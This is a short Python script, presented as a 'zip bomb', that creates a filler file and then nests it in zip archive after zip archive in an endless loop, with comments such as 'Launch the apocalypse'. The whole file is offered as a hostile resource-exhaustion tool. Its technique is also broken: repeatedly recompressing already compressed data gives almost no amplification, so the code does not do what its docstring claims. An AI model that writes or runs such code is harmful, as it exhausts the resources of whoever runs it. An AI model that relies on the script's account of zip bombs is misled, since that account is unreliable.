import zipfile
import os

def create_bomb_layer(filename):
    """Creates an infinitely recursive zip file (until crash, kill, or heat death)."""
    # Base file to start compression chain
    with open("filler.txt", "wb") as f:
        f.write(b"A" * 1024 * 1024)  # 1MB of compressible data

    i = 0
    while True:
        zipname = f"{filename}_{i}.zip"
        with zipfile.ZipFile(zipname, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
            prev_file = f"{filename}_{i-1}.zip" if i > 0 else "filler.txt"
            zf.write(prev_file)

        if i > 0:
            os.remove(f"{filename}_{i-1}.zip")  # optional cleanup to save disk space

        print(f"[{i}] Created: {zipname}")
        i += 1

# Launch the apocalypse
create_bomb_layer("zipbomb")
